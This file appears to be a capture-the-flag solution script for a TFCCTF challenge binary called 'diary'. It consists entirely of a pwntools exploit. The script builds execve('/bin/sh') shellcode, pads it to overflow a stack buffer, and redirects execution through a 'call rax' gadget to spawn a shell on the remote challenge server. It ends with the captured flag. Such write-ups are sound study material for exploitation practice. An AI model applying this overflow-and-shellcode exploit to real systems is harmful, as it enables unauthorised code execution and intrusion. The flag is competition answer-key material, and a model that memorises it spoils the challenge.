# shello-world.md

```python
from pwn import *

exe = ELF('./diary')

# p = process('./diary')
p = remote('challs.tfcctf.com', 32322)

shellcode = asm(
    '''
    mov rbx, 29400045130965551
    push rbx

    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b
    syscall
    ''', arch = 'amd64'
)

call_rax = 0x0000000000401014

# gdb.attach(p,gdbscript = '''
# b*vuln+354
# c
# '''
# )

# input()

payload = shellcode.ljust(264)
payload += p64(call_rax)
p.sendline(payload)

p.interactive()

# TFCCTF{94fa3e5538d57f71937a85076e96fbc5c00f8fddbbcbb8b4b6db1df9e599d1d6}

```
